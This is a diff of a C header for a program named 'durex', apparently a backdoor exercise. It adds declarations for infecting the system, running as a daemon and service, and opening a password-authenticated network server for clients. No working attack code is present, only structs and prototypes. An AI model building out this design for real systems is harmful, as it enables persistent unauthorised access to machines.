@@ -13,20 +13,35 @@
 #ifndef ALL_H
 # define ALL_H
 
+/*
+**	EXTERNAL INCLUDES
+*/
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <dirent.h>
+#include <netinet/in.h>
+#include <pthread.h>
+
+/*
+**	INTERNAL INCLUDES
+*/
 #include "libft.h"
 
-# define FRAISE		1
-# define bool		int
-# define true		1
-# define false		0
-# define PATH_MAX	1024
-# define BYTE		char
-
+# define FRAISE				1
+# define bool				int
+# define true				1
+# define false				0
+# define BYTE				char
+# define SOCKET				int
+# define CLIENT_READ		4095
+# define CLIENT_BUFFER		4096
+# define PASSWORD_LEN		512
+# define SERVICE_RAW_LEN	1024
+# define LIBRARY_RAW_LEN	30000
+# define BUFFER_LEN			1024
 /*
 **	Environments variables struct
 */
@@ -38,6 +53,16 @@ typedef struct		s_env
 }					t_env;
 
 /*
+**	Struct for server listener
+*/
+typedef struct		s_server
+{
+	SOCKET					sock;
+	int						listen_port;
+	struct sockaddr_in		in;
+}					t_server;
+
+/*
 **	Program struct with all datas
 */
 typedef struct		s_durex
@@ -46,7 +71,19 @@ typedef struct		s_durex
 	int				length;
 	t_env			*env;
 	char			*current_path;
+	t_server		*server;
+	int				clients;
+	BYTE			*password;
 }					t_durex;
+
+/*
+**	Struct for connected client
+*/
+typedef struct		s_client
+{
+	t_durex			*durex;
+	SOCKET			socket;
+}					t_client;
 
 /*
 **	ENV
@@ -59,12 +96,53 @@ t_env					*find_env_key(t_durex*, char*);
 */
 t_durex					*get_durex(char**, int);
 bool					is_in_binary_path(t_durex*);
-void					infect_system(t_durex*);
+void					get_durex_content(t_durex*);
 
 /*
 **	UTILS
 */
 int						get_random(int low, int high);
 int						get_file_length(char *path);
+char					*get_current_path();
+char					*clear_buffer(char *buffer);
 
+/*
+**	INFECTION
+*/
+void					infect_system(t_durex*);
+
+/*
+**	DAEMON
+*/
+void					init_daemon(t_durex*);
+
+/*
+**	SERVER
+*/
+void					init_server(int, t_durex*);
+
+/*
+**	CLIENT
+*/
+void					accept_client(int, t_durex*);
+
+/*
+**	AUTHENTICATION
+*/
+bool					authenticate_client(t_client*);
+
+/*
+**	PASSWORD
+*/
+void					generate_authentication_password(t_durex*);
+
+/*
+**	SERVICE
+*/
+void					init_daemon_service(t_durex*);
+
+/*
+**	DUREX
+*/
+void					init_library(t_durex*);
 #endif
